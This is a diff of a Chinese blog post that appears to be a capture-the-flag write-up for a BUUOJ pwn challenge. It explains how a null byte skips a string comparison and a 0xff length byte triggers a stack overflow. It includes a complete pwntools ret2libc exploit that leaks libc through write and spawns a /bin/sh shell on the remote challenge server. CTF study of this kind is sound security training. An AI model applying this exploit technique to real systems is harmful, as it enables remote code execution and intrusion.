+<p><img src="https://s2.loli.net/2022/04/03/HZDy21KIEf986LF.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-03 160816"></p>
+<p><img src="https://s2.loli.net/2022/04/03/sp7W5MItrBYvwEj.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-03 160827"></p>
+<p><img src="https://s2.loli.net/2022/04/03/BxicPIzN45TlebU.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-03 160837"></p>
 <p>程序先从文件里读入数据，然后让我们输入字符串，并进行比较，如果一样就可以继续操作，然后就可以利用栈溢出来得到libc,从而解决问题。</p>
-<p><strong>因为我们不知道程序读入的数据是多少，于是我们只能修改我们输入的值，让它对比通过，可以直接将字符串截断，因为是空字符串，于是肯定能比较成功，在payload中""可以截断字符串，然后再将buf[7]取最大值就行了""(255)</strong></p>
+<p><strong>因为我们不知道程序读入的数据是多少，于是我们只能修改我们输入的值，让它对比通过，可以直接将字符串截断，因为是空字符串，于是肯定能比较成功，在payload中&quot;\x00&quot;可以截断字符串，然后再将buf[7]取最大值就行了&quot;\xff&quot;(255)</strong></p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a= remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29138</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc_32.so.6&quot;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=<span class="hljs-number">0x08048825</span><br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span> <span class="hljs-comment">#\x00直接截断字符串，于是可以跳过字符串对比 \xff=255这样超过了buf的大小于是可以栈溢出</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xeb</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">0</span>)+p32(write_got)<br>a.sendline(payload2)<br>write_addr=u32(a.recv(<span class="hljs-number">4</span>))<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span> <span class="hljs-comment">#\x00直接截断字符串，于是可以跳过字符串对比 \xff=255这样超过了buf的大小于是可以栈溢出</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xeb</span>+p32(system_addr)+p32(<span class="hljs-number">1</span>)+p32(bin_sh_addr)<br>a.sendline(payload2)<br>a.interactive()<br><br></code></pre></td></tr></table></figure>
 
@@ -771,7 +561,7 @@ alt="屏幕截图 2022-04-03 160837" />
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>HXDCHLl</div>
+          <div>Lin Xinjie</div>
         </div>
       
       
